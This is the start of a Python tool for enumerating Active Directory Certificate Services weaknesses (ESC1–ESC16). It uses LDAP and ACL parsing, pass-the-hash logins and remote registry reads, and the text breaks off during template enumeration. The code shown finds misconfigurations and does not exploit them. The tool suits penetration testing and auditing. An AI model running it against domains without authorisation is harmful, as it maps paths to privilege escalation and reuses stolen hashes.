#!/usr/bin/env python3


import os
import sys
import re
import struct
import socket
import ssl
import json
import base64
import hashlib
import random
import string
import signal
import binascii
import warnings
import threading
from datetime import datetime, timedelta, timezone

warnings.filterwarnings("ignore")

try:
    from ldap3 import Server, Connection, ALL, NTLM, SASL, KERBEROS
    from ldap3.core.exceptions import LDAPBindError, LDAPSocketOpenError, LDAPOperationResult

except ImportError:
    print("[ERROR] ldap3 not installed. Run: pip install ldap3")
    sys.exit(1)

try:
    from colorama import Fore, Style, init
except ImportError:
    print("[ERROR] colorama not installed. Run: pip install colorama")
    sys.exit(1)

try:
    from impacket.krb5 import constants
    from impacket.krb5.asn1 import AS_REQ, KERB_PA_PAC_REQUEST, KRB_ERROR, AS_REP, seq_set, seq_set_iter
    from impacket.krb5.kerberosv5 import sendReceive, KerberosError
    from impacket.krb5.types import KerberosTime, Principal
    from impacket.dcerpc.v5 import transport, icpr, rpcrt, rrp, scmr
    from impacket.dcerpc.v5.dtypes import NULL
    from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_GSS_NEGOTIATE
    from impacket.ldap import ldaptypes
    from impacket.ntlm import compute_nthash
    from impacket.smbconnection import SMBConnection
except ImportError:
    print("[ERROR] impacket not installed. Run: pip install impacket")
    sys.exit(1)

try:
    from pyasn1.codec.der import decoder, encoder
    from pyasn1.type.univ import noValue, OctetString, Integer, BitString
    from pyasn1.type.char import UTF8String
except ImportError:
    print("[ERROR] pyasn1 not installed. Run: pip install pyasn1")
    sys.exit(1)

try:
    from cryptography import x509
    from cryptography.x509.oid import NameOID, ExtensionOID
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import rsa, padding
except ImportError:
    print("[ERROR] cryptography not installed. Run: pip install cryptography")
    sys.exit(1)

init(autoreset=True)


def _exit_handler(sig, frame):
    print(Fore.YELLOW + "\n\n[!] Exiting... Goodbye!" + Style.RESET_ALL)
    sys.exit(0)

signal.signal(signal.SIGINT, _exit_handler)


# ═══════════════════════════════════════════════════════════════════════════════
# ESC DEFINITIONS WITH IMPLEMENTATION STATUS
# ═══════════════════════════════════════════════════════════════════════════════

ESC_TECHNIQUES = {
    "ESC1": {
        "name": "Enrollee-Supplied SAN Abuse",
        "description": "Template allows enrollee to supply SAN with Client Authentication EKU.",
        "implemented": True,
        "detection_method": "LDAP Template + ACL",
        "severity": "CRITICAL"
    },
    "ESC2": {
        "name": "Any Purpose / No EKU Abuse",
        "description": "Template has Any Purpose EKU or no EKU defined.",
        "implemented": True,
        "detection_method": "LDAP Template + ACL",
        "severity": "CRITICAL"
    },
    "ESC3": {
        "name": "Enrollment Agent Abuse",
        "description": "Two-template attack using Certificate Request Agent EKU.",
        "implemented": True,
        "detection_method": "LDAP Template Enumeration",
        "severity": "HIGH"
    },
    "ESC4": {
        "name": "Template ACL Abuse",
        "description": "User has write privileges over a certificate template.",
        "implemented": True,
        "detection_method": "LDAP Security Descriptor Parsing",
        "severity": "HIGH"
    },
    "ESC5": {
        "name": "PKI Object ACL Abuse",
        "description": "Write access to NTAuthCertificates, CA objects, or parent containers.",
        "implemented": True,
        "detection_method": "LDAP Security Descriptor Parsing",
        "severity": "CRITICAL"
    },
    "ESC6": {
        "name": "EDITF_ATTRIBUTESUBJECTALTNAME2 Abuse",
        "description": "CA has EDITF_ATTRIBUTESUBJECTALTNAME2 flag enabled.",
        "implemented": True,
        "detection_method": "Remote Registry via MS-RRP",
        "severity": "HIGH"
    },
    "ESC7": {
        "name": "Vulnerable CA Access Control",
        "description": "User has ManageCA or ManageCertificates rights on CA.",
        "implemented": True,
        "detection_method": "LDAP Security Descriptor Parsing",
        "severity": "HIGH"
    },
    "ESC8": {
        "name": "NTLM Relay to Web Enrollment",
        "description": "AD CS Web Enrollment endpoint enabled over HTTP.",
        "implemented": True,
        "detection_method": "HTTP Endpoint Probing",
        "severity": "HIGH"
    },
    "ESC9": {
        "name": "No Security Extension (Template)",
        "description": "Template has CT_FLAG_NO_SECURITY_EXTENSION set.",
        "implemented": True,
        "detection_method": "LDAP Template Enumeration",
        "severity": "HIGH"
    },
    "ESC10": {
        "name": "Weak Certificate Mapping (Registry)",
        "description": "Weak certificate mapping enabled via registry.",
        "implemented": True,
        "detection_method": "Remote Registry via MS-RRP",
        "severity": "HIGH"
    },
    "ESC11": {
        "name": "NTLM Relay to RPC Interface",
        "description": "CA RPC interface does not enforce encryption.",
        "implemented": True,
        "detection_method": "RPC Interface Testing",
        "severity": "HIGH"
    },
    "ESC12": {
        "name": "YubiHSM2 / External HSM Key Extraction",
        "description": "CA private key stored on external HSM with accessible credentials.",
        "implemented": False,
        "detection_method": "Requires CA Server Shell Access",
        "severity": "CRITICAL"
    },
    "ESC13": {
        "name": "Issuance Policy Group Link Abuse",
        "description": "Issuance policy OID linked to privileged group via msDS-OIDToGroupLink.",
        "implemented": True,
        "detection_method": "LDAP OID Enumeration",
        "severity": "HIGH"
    },
    "ESC14": {
        "name": "Explicit Certificate Mapping Abuse",
        "description": "Abuse weak explicit certificate mappings in altSecurityIdentities.",
        "implemented": True,
        "detection_method": "LDAP User Object Enumeration",
        "severity": "MEDIUM"
    },
    "ESC15": {
        "name": "EKUwu - Application Policy Injection (CVE-2024-49019)",
        "description": "Schema V1 templates don't validate Application Policy extensions.",
        "implemented": True,
        "detection_method": "LDAP Template Enumeration",
        "severity": "CRITICAL"
    },
    "ESC16": {
        "name": "Security Extension Disabled on CA",
        "description": "CA globally disables SID security extension via DisableExtensionList.",
        "implemented": True,
        "detection_method": "Remote Registry via MS-RRP",
        "severity": "CRITICAL"
    }
}


# ═══════════════════════════════════════════════════════════════════════════════
# BANNER & UI
# ═══════════════════════════════════════════════════════════════════════════════

def banner():
    print(Fore.CYAN + """
    ╔═══════════════════════════════════════════════════════════════════════╗
    ║                          Cert Enroll Abuse                            ║
    ║         Comprehensive AD CS Enumeration - ESC1 through ESC16          ║
    ╚═══════════════════════════════════════════════════════════════════════╝
    """)


def print_esc_menu():
    """Print the ESC technique selection menu."""
    print(Fore.CYAN + "\n[*] Available ESC Attack Techniques:" + Style.RESET_ALL)
    print(Fore.WHITE + "    " + "=" * 75 + Style.RESET_ALL)

    for esc_id, info in ESC_TECHNIQUES.items():
        severity_color = Fore.RED if info["severity"] == "CRITICAL" else Fore.YELLOW if info["severity"] == "HIGH" else Fore.WHITE
        impl_color = Fore.GREEN if info["implemented"] else Fore.RED
        impl_status = "[OK]" if info["implemented"] else "[N/A]"

        print(Fore.CYAN + f"    {esc_id:<6}" + Style.RESET_ALL + 
              f" - {info['name']:<40} " + 
              severity_color + f"[{info['severity']}]" + Style.RESET_ALL + " " +
              impl_color + impl_status + Style.RESET_ALL)

    print(Fore.WHITE + "    " + "=" * 75 + Style.RESET_ALL)
    print(Fore.CYAN + "    ALL    - Run full enumeration" + Style.RESET_ALL)
    print(Fore.WHITE + "    " + "=" * 75 + Style.RESET_ALL)


def print_esc_details(esc_id):
    """Print detailed information about an ESC technique."""
    info = ESC_TECHNIQUES.get(esc_id)
    if not info:
        print(Fore.RED + f"[!] Unknown ESC technique: {esc_id}" + Style.RESET_ALL)
        return

    severity_color = Fore.RED if info["severity"] == "CRITICAL" else Fore.YELLOW if info["severity"] == "HIGH" else Fore.WHITE
    impl_color = Fore.GREEN if info["implemented"] else Fore.RED

    print(Fore.CYAN + f"\n{'='*75}" + Style.RESET_ALL)
    print(Fore.CYAN + f"  {esc_id}: {info['name']}" + Style.RESET_ALL)
    print(Fore.CYAN + f"{'='*75}" + Style.RESET_ALL)
    print(Fore.WHITE + f"  Description: {info['description']}" + Style.RESET_ALL)
    print(Fore.WHITE + f"  Detection: {info['detection_method']}" + Style.RESET_ALL)
    print(severity_color + f"  Severity: {info['severity']}" + Style.RESET_ALL)
    print(impl_color + f"  Status: {'IMPLEMENTED' if info['implemented'] else 'NOT IMPLEMENTED'}" + Style.RESET_ALL)
    print(Fore.CYAN + f"{'='*75}" + Style.RESET_ALL)


# ═══════════════════════════════════════════════════════════════════════════════
# INPUT VALIDATION
# ═══════════════════════════════════════════════════════════════════════════════

def validate_ip(ip):
    pattern = r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$'
    if not re.match(pattern, ip):
        return False
    return all(0 <= int(p) <= 255 for p in ip.split('.'))


def validate_domain(domain):
    pattern = r'^([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}$'
    if not re.match(pattern, domain):
        return False
    for part in domain.split('.'):
        if part.startswith('-') or part.endswith('-') or not part:
            return False
    return True


def validate_username(username):
    if '\\' in username or '@' in username:
        return True
    return len(username) > 0 and re.match(r'^[a-zA-Z0-9._-]+$', username)


def get_input(prompt, validator=None, error_msg=None, allow_empty=False, default=None):
    while True:
        try:
            value = input(prompt).strip()
            if not value and allow_empty:
                return default if default else ""
            if not value and not allow_empty:
                print(Fore.RED + "[!] This field cannot be empty!" + Style.RESET_ALL)
                continue
            if validator and value and not validator(value):
                print(Fore.RED + f"[!] {error_msg}" + Style.RESET_ALL)
                continue
            return value
        except KeyboardInterrupt:
            print(Fore.YELLOW + "\n\n[!] Exiting... Goodbye!" + Style.RESET_ALL)
            sys.exit(0)


def resolve_file_path(user_input):
    user_input = user_input.lstrip('/').lstrip('\\')
    return os.path.normpath(os.path.join(os.getcwd(), user_input))


def validate_file(file_path, check_empty=True):
    full_path = resolve_file_path(file_path)
    if not os.path.exists(full_path):
        print(Fore.RED + f"[!] File not found: {full_path}" + Style.RESET_ALL)
        return None
    if check_empty and os.path.getsize(full_path) == 0:
        print(Fore.RED + f"[!] File is empty: {full_path}" + Style.RESET_ALL)
        return None
    if not os.access(full_path, os.R_OK):
        print(Fore.RED + f"[!] Cannot read file: {full_path}" + Style.RESET_ALL)
        return None
    return full_path


def resolve_output_file(user_input, default_prefix="ceat-output"):
    if not user_input:
        timestamp = datetime.now().strftime("%Y-%m-%d-%H-%M-%S")
        filename = f"{default_prefix}-{timestamp}.json"
        return os.path.join(os.getcwd(), filename)

    full_path = resolve_file_path(user_input)
    directory = os.path.dirname(full_path)

    if directory and not os.path.exists(directory):
        try:
            os.makedirs(directory, exist_ok=True)
            print(Fore.YELLOW + f"[*] Created directory: {directory}" + Style.RESET_ALL)
        except PermissionError:
            print(Fore.RED + f"[!] Permission denied: {directory}" + Style.RESET_ALL)
            fallback = os.path.join(os.getcwd(), os.path.basename(user_input))
            print(Fore.YELLOW + f"[*] Saving to: {fallback}" + Style.RESET_ALL)
            return fallback
        except Exception as e:
            print(Fore.RED + f"[!] Cannot create directory: {e}" + Style.RESET_ALL)
            sys.exit(1)

    return full_path


# ═══════════════════════════════════════════════════════════════════════════════
# ACL PARSER (Security Descriptor Analysis)
# ═══════════════════════════════════════════════════════════════════════════════

class ACL_PARSER:
    """Parse Windows Security Descriptors using impacket's ldaptypes."""

    GENERIC_ALL = 0x10000000
    GENERIC_WRITE = 0x20000000
    GENERIC_READ = 0x80000000
    WRITE_DACL = 0x00040000
    WRITE_OWNER = 0x00080000

    ADS_RIGHT_DS_CONTROL_ACCESS = 0x00000100
    ADS_RIGHT_DS_WRITE_PROP = 0x00000020
    ADS_RIGHT_DS_READ_PROP = 0x00000010

    def __init__(self, domain_sid=None):
        self.domain_sid = domain_sid

    def parse_sid(self, sid_bytes):
        """Parse binary SID to string."""
        try:
            if isinstance(sid_bytes, str):
                return sid_bytes

            revision = sid_bytes[0]
            sub_authority_count = sid_bytes[1]
            identifier_authority = struct.unpack('>Q', b'\x00\x00' + sid_bytes[2:8])[0]

            sid_str = f"S-{revision}-{identifier_authority}"
            offset = 8
            for i in range(sub_authority_count):
                sub_authority = struct.unpack('<I', sid_bytes[offset:offset+4])[0]
                sid_str += f"-{sub_authority}"
                offset += 4

            return sid_str
        except Exception as e:
            return f"UNKNOWN_SID"

    def parse_ace(self, ace_bytes):
        """Parse a single ACE."""
        try:
            if len(ace_bytes) < 4:
                return None

            ace_type = ace_bytes[0]
            ace_flags = ace_bytes[1]
            ace_size = struct.unpack('<H', ace_bytes[2:4])[0]

            if ace_type == 0x00:  # ACCESS_ALLOWED_ACE_TYPE
                mask = struct.unpack('<I', ace_bytes[4:8])[0]
                sid_start = 8
                sid_bytes = ace_bytes[sid_start:ace_size]
                sid = self.parse_sid(sid_bytes)
                return {"type": "ACCESS_ALLOWED", "mask": mask, "sid": sid}

            elif ace_type == 0x05:  # ACCESS_ALLOWED_OBJECT_ACE_TYPE
                mask = struct.unpack('<I', ace_bytes[4:8])[0]
                flags = struct.unpack('<I', ace_bytes[8:12])[0]
                object_type = ace_bytes[12:28]
                inherited_object_type = ace_bytes[28:44]
                sid_start = 44
                sid_bytes = ace_bytes[sid_start:ace_size]
                sid = self.parse_sid(sid_bytes)

                return {
                    "type": "ACCESS_ALLOWED_OBJECT",
                    "mask": mask,
                    "flags": flags,
                    "object_type": binascii.hexlify(object_type).decode(),
                    "sid": sid
                }

            return None
        except Exception:
            return None

    def parse_security_descriptor(self, sd_bytes):
        """Parse full security descriptor."""
        try:
            if not sd_bytes or len(sd_bytes) < 20:
                return {"owner": None, "group": None, "aces": []}

            revision = sd_bytes[0]
            control = struct.unpack('<H', sd_bytes[2:4])[0]
            owner_offset = struct.unpack('<I', sd_bytes[4:8])[0]
            group_offset = struct.unpack('<I', sd_bytes[8:12])[0]
            sacl_offset = struct.unpack('<I', sd_bytes[12:16])[0]
            dacl_offset = struct.unpack('<I', sd_bytes[16:20])[0]

            owner_sid = None
            if owner_offset > 0 and owner_offset < len(sd_bytes):
                owner_sid = self.parse_sid(sd_bytes[owner_offset:])

            aces = []
            if dacl_offset > 0 and dacl_offset < len(sd_bytes):
                dacl = sd_bytes[dacl_offset:]
                if len(dacl) >= 8:
                    ace_count = struct.unpack('<H', dacl[4:6])[0]
                    ace_offset = 8
                    for i in range(ace_count):
                        if ace_offset >= len(dacl):
                            break
                        ace = self.parse_ace(dacl[ace_offset:])
                        if ace:
                            aces.append(ace)
                            ace_size = struct.unpack('<H', dacl[ace_offset+2:ace_offset+4])[0]
                            ace_offset += ace_size
                        else:
                            break

            return {"owner": owner_sid, "group": None, "aces": aces, "control": control}
        except Exception as e:
            return {"owner": None, "group": None, "aces": [], "error": str(e)}

    def check_enroll_permissions(self, sd_bytes, current_user_sid=None):
        """Check for Enroll permissions."""
        sd = self.parse_security_descriptor(sd_bytes)
        enroll_perms = []

        for ace in sd["aces"]:
            if ace["type"] in ["ACCESS_ALLOWED", "ACCESS_ALLOWED_OBJECT"]:
                mask = ace["mask"]
                has_enroll = False

                if mask & self.ADS_RIGHT_DS_CONTROL_ACCESS:
                    has_enroll = True
                if mask & self.GENERIC_ALL:
                    has_enroll = True
                if mask & self.GENERIC_WRITE:
                    has_enroll = True

                if has_enroll:
                    enroll_perms.append({"sid": ace["sid"], "mask": hex(mask)})

        return enroll_perms

    def check_dangerous_permissions(self, sd_bytes):
        """Check for dangerous permissions."""
        sd = self.parse_security_descriptor(sd_bytes)
        dangerous = []

        for ace in sd["aces"]:
            if ace["type"] in ["ACCESS_ALLOWED", "ACCESS_ALLOWED_OBJECT"]:
                mask = ace["mask"]
                risks = []

                if mask & self.GENERIC_ALL:
                    risks.append("GenericAll")
                if mask & self.GENERIC_WRITE:
                    risks.append("GenericWrite")
                if mask & self.WRITE_DACL:
                    risks.append("WriteDACL")
                if mask & self.WRITE_OWNER:
                    risks.append("WriteOwner")
                if mask & self.ADS_RIGHT_DS_WRITE_PROP:
                    risks.append("WriteProperty")
                if mask & self.ADS_RIGHT_DS_CONTROL_ACCESS:
                    risks.append("AllExtendedRights")

                if risks:
                    dangerous.append({"sid": ace["sid"], "risks": risks, "mask": hex(mask)})

        return dangerous


# ═══════════════════════════════════════════════════════════════════════════════
# REMOTE REGISTRY ACCESSOR (for ESC6, ESC10, ESC16)
# ═══════════════════════════════════════════════════════════════════════════════

class REMOTE_REGISTRY:
    """Access remote registry on CA/DC for ESC6/ESC10/ESC16 detection."""

    def __init__(self, target_ip, username=None, password=None, hashes=None, domain=None):
        self.target_ip = target_ip
        self.username = username
        self.password = password
        self.hashes = hashes
        self.domain = domain
        self.smb_conn = None
        self.rrp_pipe = None

    def connect(self):
        """Connect via SMB and open Remote Registry pipe."""
        try:
            lmhash, nthash = "", ""
            if self.hashes:
                if ":" in self.hashes:
                    parts = self.hashes.split(":")
                    if len(parts) == 2:
                        lmhash, nthash = parts
                    else:
                        nthash = parts[-1]
                else:
                    nthash = self.hashes

            self.smb_conn = SMBConnection(self.target_ip, self.target_ip)
            if self.password:
                self.smb_conn.login(self.username, self.password, self.domain, lmhash, nthash)
            elif self.hashes:
                self.smb_conn.login(self.username, '', self.domain, lmhash, nthash)
            else:
                print(Fore.YELLOW + "[*] No credentials provided for remote registry access" + Style.RESET_ALL)
                return False

            # Open Remote Registry Service
            rpctransport = transport.SMBTransport(self.target_ip, filename=r'\winreg')
            rpctransport.set_credentials(self.username, self.password, self.domain, lmhash, nthash)

            self.rrp_pipe = rpctransport.get_dce_rpc()
            self.rrp_pipe.connect()
            self.rrp_pipe.bind(rrp.MSRPC_UUID_RRP)

            print(Fore.GREEN + f"[+] Connected to remote registry on {self.target_ip}" + Style.RESET_ALL)
            return True

        except Exception as e:
            print(Fore.YELLOW + f"[*] Remote registry connection failed: {e}" + Style.RESET_ALL)
            return False

    def read_dword(self, hive, key_path, value_name):
        """Read a DWORD value from registry."""
        try:
            if not self.rrp_pipe:
                return None

            # Open hive
            hives = {
                "HKLM": rrp.HKEY_LOCAL_MACHINE,
                "HKU": rrp.HKEY_USERS,
                "HKCU": rrp.HKEY_CURRENT_USER
            }

            if hive not in hives:
                return None

            hive_handle = hives[hive]

            # Open key
            ans = rrp.hBaseRegOpenKey(self.rrp_pipe, hive_handle, key_path)
            key_handle = ans['phkResult']

            # Read value
            ans = rrp.hBaseRegQueryValue(self.rrp_pipe, key_handle, value_name)
            rrp.hBaseRegCloseKey(self.rrp_pipe, key_handle)

            if ans is not None:
                return ans['lpData']
            return None

        except Exception as e:
            return None

    def check_esc6(self):
        """Check for EDITF_ATTRIBUTESUBJECTALTNAME2 flag."""
        try:
            # CA config is at HKLM\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_Name>
            # The flag is in PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\EditFlags
            # This is a DWORD bitmask
            # EDITF_ATTRIBUTESUBJECTALTNAME2 = 0x00040000

            key_path = r"SYSTEM\CurrentControlSet\Services\CertSvc\Configuration"

            # List subkeys to find CA name
            ans = rrp.hBaseRegOpenKey(self.rrp_pipe, rrp.HKEY_LOCAL_MACHINE, key_path)
            if ans is None:
                return None

            key_handle = ans['phkResult']

            # Enumerate subkeys
            try:
                ans = rrp.hBaseRegEnumKey(self.rrp_pipe, key_handle, 0)
                ca_name = ans['lpNameOut'][:-1]

                policy_path = f"{key_path}\\{ca_name}\\PolicyModules\\CertificateAuthority_MicrosoftDefault.Policy"

                ans2 = rrp.hBaseRegOpenKey(self.rrp_pipe, rrp.HKEY_LOCAL_MACHINE, policy_path)
                if ans2:
                    policy_handle = ans2['phkResult']
                    ans3 = rrp.hBaseRegQueryValue(self.rrp_pipe, policy_handle, "EditFlags")
                    rrp.hBaseRegCloseKey(self.rrp_pipe, policy_handle)

                    if ans3 and ans3['lpData']:
                        edit_flags = ans3['lpData']
                        if isinstance(edit_flags, int):
                            has_flag = bool(edit_flags & 0x00040000)
                            return {
                                "ca_name": ca_name,
                                "edit_flags": hex(edit_flags),
                                "has_editf_attributesubjectaltname2": has_flag
                            }
            except:
                pass
            finally:
                rrp.hBaseRegCloseKey(self.rrp_pipe, key_handle)

            return None

        except Exception as e:
            return None

    def check_esc10(self):
        """Check CertificateMappingMethods and StrongCertificateBindingEnforcement."""
        try:
            results = {}

            # CertificateMappingMethods at HKLM\System\CurrentControlSet\Control\SecurityProviders\Schannel
            key_path = r"System\CurrentControlSet\Control\SecurityProviders\Schannel"
            ans = rrp.hBaseRegOpenKey(self.rrp_pipe, rrp.HKEY_LOCAL_MACHINE, key_path)
            if ans:
                key_handle = ans['phkResult']
                try:
                    ans2 = rrp.hBaseRegQueryValue(self.rrp_pipe, key_handle, "CertificateMappingMethods")
                    if ans2 and ans2['lpData']:
                        mapping_methods = ans2['lpData']
                        if isinstance(mapping_methods, int):
                            has_upn = bool(mapping_methods & 0x04)
                            results["certificate_mapping_methods"] = {
                                "value": hex(mapping_methods),
                                "has_upn_mapping": has_upn
                            }
                except:
                    pass
                finally:
                    rrp.hBaseRegCloseKey(self.rrp_pipe, key_handle)

            # StrongCertificateBindingEnforcement at HKLM\System\CurrentControlSet\Services\Kdc
            key_path2 = r"System\CurrentControlSet\Services\Kdc"
            ans = rrp.hBaseRegOpenKey(self.rrp_pipe, rrp.HKEY_LOCAL_MACHINE, key_path2)
            if ans:
                key_handle = ans['phkResult']
                try:
                    ans2 = rrp.hBaseRegQueryValue(self.rrp_pipe, key_handle, "StrongCertificateBindingEnforcement")
                    if ans2 and ans2['lpData']:
                        binding = ans2['lpData']
                        if isinstance(binding, int):
                            results["strong_certificate_binding"] = {
                                "value": binding,
                                "is_disabled": binding == 0,
                                "is_enforced": binding == 2
                            }
                except:
                    pass
                finally:
                    rrp.hBaseRegCloseKey(self.rrp_pipe, key_handle)

            return results if results else None

        except Exception as e:
            return None

    def check_esc16(self):
        """Check DisableExtensionList for szOID_NTDS_CA_SECURITY_EXT."""
        try:
            # DisableExtensionList at HKLM\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA>\PolicyModules\...
            key_path = r"SYSTEM\CurrentControlSet\Services\CertSvc\Configuration"

            ans = rrp.hBaseRegOpenKey(self.rrp_pipe, rrp.HKEY_LOCAL_MACHINE, key_path)
            if ans is None:
                return None

            key_handle = ans['phkResult']

            try:
                ans = rrp.hBaseRegEnumKey(self.rrp_pipe, key_handle, 0)
                ca_name = ans['lpNameOut'][:-1]

                policy_path = f"{key_path}\\{ca_name}\\PolicyModules\\CertificateAuthority_MicrosoftDefault.Policy"

                ans2 = rrp.hBaseRegOpenKey(self.rrp_pipe, rrp.HKEY_LOCAL_MACHINE, policy_path)
                if ans2:
                    policy_handle = ans2['phkResult']
                    try:
                        ans3 = rrp.hBaseRegQueryValue(self.rrp_pipe, policy_handle, "DisableExtensionList")
                        if ans3 and ans3['lpData']:
                            disable_list = ans3['lpData']
                            # Check if 1.3.6.1.4.1.311.25.2 (szOID_NTDS_CA_SECURITY_EXT) is in the list
                            has_security_ext_disabled = "1.3.6.1.4.1.311.25.2" in str(disable_list)
                            return {
                                "ca_name": ca_name,
                                "disable_extension_list": str(disable_list),
                                "has_security_ext_disabled": has_security_ext_disabled
                            }
                    except:
                        pass
                    finally:
                        rrp.hBaseRegCloseKey(self.rrp_pipe, policy_handle)
            except:
                pass
            finally:
                rrp.hBaseRegCloseKey(self.rrp_pipe, key_handle)

            return None

        except Exception as e:
            return None

    def disconnect(self):
        if self.rrp_pipe:
            try:
                self.rrp_pipe.disconnect()
            except:
                pass
        if self.smb_conn:
            try:
                self.smb_conn.logoff()
            except:
                pass


# ═══════════════════════════════════════════════════════════════════════════════
# AD CS ENUMERATOR (Main Engine)
# ═══════════════════════════════════════════════════════════════════════════════

class ADCS_ENUMERATOR:
    """AD CS Enumeration engine using pure LDAP queries with ACL parsing."""

    EKU_CLIENT_AUTH = "1.3.6.1.5.5.7.3.2"
    EKU_SMART_CARD = "1.3.6.1.4.1.311.20.2.2"
    EKU_ANY_PURPOSE = "2.5.29.37.0"
    EKU_CERT_REQUEST_AGENT = "1.3.6.1.4.1.311.20.2.1"
    EKU_PKINIT_CLIENT = "1.3.6.1.5.2.3.4"
    EKU_SERVER_AUTH = "1.3.6.1.5.5.7.3.1"

    CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT = 0x00000001
    CT_FLAG_NO_SECURITY_EXTENSION = 0x00080000
    CT_FLAG_PEND_ALL_REQUESTS = 0x00000002

    def __init__(self, dc_ip, domain, username=None, password=None, hashes=None, 
                 use_ldaps=False, target_user=None):
        self.dc_ip = dc_ip
        self.domain = domain.upper()
        self.username = username
        self.password = password
        self.hashes = hashes
        self.use_ldaps = use_ldaps
        self.target_user = target_user
        self.conn = None
        self.base_dn = None
        self.config_dn = None
        self.acl_parser = None
        self.current_user_sid = None
        self.results = {
            "timestamp": datetime.now().isoformat(),
            "domain": domain,
            "dc_ip": dc_ip,
            "cas": [],
            "templates": [],
            "vulnerabilities": {},
            "pki_objects": {},
            "registry_findings": {},
            "acl_findings": []
        }

    def connect(self):
        """Establish LDAP connection to DC with proper authentication."""
        try:
            self.base_dn = ",".join([f"DC={part}" for part in self.domain.split(".")])
            self.config_dn = f"CN=Configuration,{self.base_dn}"

            protocol = "ldaps" if self.use_ldaps else "ldap"
            server = Server(f"{protocol}://{self.dc_ip}", get_info=ALL, connect_timeout=10)

            # Format username with domain if needed
            formatted_user = self.username
            if formatted_user and "@" not in formatted_user and "\\" not in formatted_user:
                formatted_user = f"{formatted_user}@{self.domain}"
                print(Fore.YELLOW + f"[*] Auto-formatted username to: {formatted_user}" + Style.RESET_ALL)

            if formatted_user and self.password:
                # For password auth, try SIMPLE first, then NTLM if that fails
                try:
                    self.conn = Connection(server, user=formatted_user, password=self.password, 
                                           auto_bind=True)
                    print(Fore.GREEN + f"[+] Connected via SIMPLE auth" + Style.RESET_ALL)
                except:
                    # Fallback to NTLM
                    self.conn = Connection(server, user=formatted_user, password=self.password, 
                                           authentication=NTLM, auto_bind=True)
                    print(Fore.GREEN + f"[+] Connected via NTLM auth" + Style.RESET_ALL)

            elif formatted_user and self.hashes:
                # For pass-the-hash, must use NTLM
                self.conn = Connection(server, user=formatted_user, password=self.hashes,
                                       authentication=NTLM, auto_bind=True)
                print(Fore.GREEN + f"[+] Connected via NTLM (Pass-the-Hash)" + Style.RESET_ALL)
            else:
                print(Fore.YELLOW + "[*] Attempting anonymous LDAP bind..." + Style.RESET_ALL)
                self.conn = Connection(server, auto_bind=True)

            print(Fore.GREEN + f"[+] Connected to {self.dc_ip} via LDAP" + Style.RESET_ALL)

            if self.username:
                self._resolve_current_user_sid()

            self.acl_parser = ACL_PARSER()
            return True

        except LDAPBindError as e:
            error_msg = str(e)
            print(Fore.RED + f"[!] LDAP bind failed: {error_msg}" + Style.RESET_ALL)

            if "invalid credentials" in error_msg.lower():
                print(Fore.YELLOW + "[*] Invalid credentials. Check username and password." + Style.RESET_ALL)
            elif "anonymous" in error_msg.lower() or not self.username:
                print(Fore.YELLOW + "[*] Anonymous LDAP is disabled. Provide valid credentials." + Style.RESET_ALL)
            else:
                print(Fore.YELLOW + "[*] Check: username format (user@domain.com or DOMAIN\\user), password, domain name, and DC IP" + Style.RESET_ALL)
            return False

        except LDAPSocketOpenError as e:
            print(Fore.RED + f"[!] Cannot connect to {self.dc_ip}: {e}" + Style.RESET_ALL)
            print(Fore.YELLOW + "[*] Check: DC IP address, network connectivity, firewall rules, LDAP port (389/636)" + Style.RESET_ALL)
            return False

        except Exception as e:
            error_msg = str(e)
            print(Fore.RED + f"[!] Connection error: {error_msg}" + Style.RESET_ALL)
            print(Fore.YELLOW + "[*] Check: credentials, domain name, DC IP, network connectivity" + Style.RESET_ALL)
            return False

    def _resolve_current_user_sid(self):
        """Resolve current user's SID from LDAP."""
        try:
            user_filter = f"(sAMAccountName={self.username.split('@')[0].split('\\')[-1]})"
            self.conn.search(self.base_dn, user_filter, attributes=["objectSid"])
            if self.conn.entries:
                sid_bytes = self.conn.entries[0].objectSid.value
                self.current_user_sid = self.acl_parser.parse_sid(sid_bytes) if self.acl_parser else str(sid_bytes)
                print(Fore.GREEN + f"[+] Current user SID: {self.current_user_sid}" + Style.RESET_ALL)
        except Exception as e:
            print(Fore.YELLOW + f"[*] Could not resolve user SID: {e}" + Style.RESET_ALL)

    def unbind(self):
        if self.conn:
            try:
                self.conn.unbind()
            except:
                pass

    def enumerate_cas(self):
        """Enumerate Certificate Authorities."""
        print(Fore.YELLOW + "\n[*] Enumerating Certificate Authorities..." + Style.RESET_ALL)

        search_base = f"CN=Enrollment Services,CN=Public Key Services,CN=Services,{self.config_dn}"
        try:
            self.conn.search(search_base, "(objectClass=pKIEnrollmentService)", 
                            attributes=["cn", "dNSHostName", "cACertificate", "certificateTemplates",
                                       "msPKI-Enrollment-Servers", "flags"])

            for entry in self.conn.entries:
                ca_info = {
                    "name": str(entry.cn) if hasattr(entry, 'cn') else "Unknown",
                    "dns_hostname": str(entry.dNSHostName) if hasattr(entry, 'dNSHostName') else "",
                    "templates": list(entry.certificateTemplates) if hasattr(entry, 'certificateTemplates') else [],
                    "has_web_enrollment": False,
                    "has_rpc_enrollment": True,
                    "web_enrollment_url": None
                }
                self.results["cas"].append(ca_info)
                print(Fore.GREEN + f"    [+] CA: {ca_info['name']}" + Style.RESET_ALL)
                print(Fore.WHITE + f"        DNS: {ca_info['dns_hostname']}" + Style.RESET_ALL)
        except Exception as e:
            print(Fore.RED + f"[!] CA enumeration error: {e}" + Style.RESET_ALL)

    def enumerate_templates(self):
        """Enumerate certificate templates with vulnerability checks."""
        print(Fore.YELLOW + "\n[*] Enumerating Certificate Templates..." + Style.RESET_ALL)

        search_base = f"CN=Certificate Templates,CN=Public Key Services,CN=Services,{self.config_dn}"
        try:
            self.conn.search(search_base, "(objectClass=pKICertificateTemplate)",
                            attributes=["cn", "msPKI-Certificate-Name-Flag", "msPKI-Enrollment-Flag",
                                       "pKIExtendedKeyUsage", "msPKI-RA-Signature", "msPKI-RA-Policies",
                                       "msPKI-Certificate-Application-Policy", "pKIMaxIssuingDepth",
                                       "msPKI-Template-Schema-Version", "nTSecurityDescriptor"],
                            controls=[security_descriptor_control()])

            for entry in self.conn.entries:
                template = self._parse_template(entry)
